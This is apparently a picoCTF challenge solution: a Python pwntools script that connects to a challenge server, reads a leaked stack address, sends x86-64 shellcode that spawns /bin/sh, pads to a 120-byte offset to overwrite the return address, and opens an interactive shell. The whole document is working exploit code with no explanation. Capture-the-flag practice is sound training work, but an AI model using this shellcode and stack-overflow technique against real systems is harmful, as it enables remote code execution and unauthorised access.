from pwn import *

host = 'mercury.picoctf.net'
port = 11022

offset = 120

p = remote(host, port)

addr = int(p.recvline()[2:-1], 16)

print(hex(addr))

shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

p.sendline(shellcode)
p.recvline()

shellcode += b'A'*(offset-len(shellcode)) + p64(addr)
p.sendline(shellcode)

p.interactive()
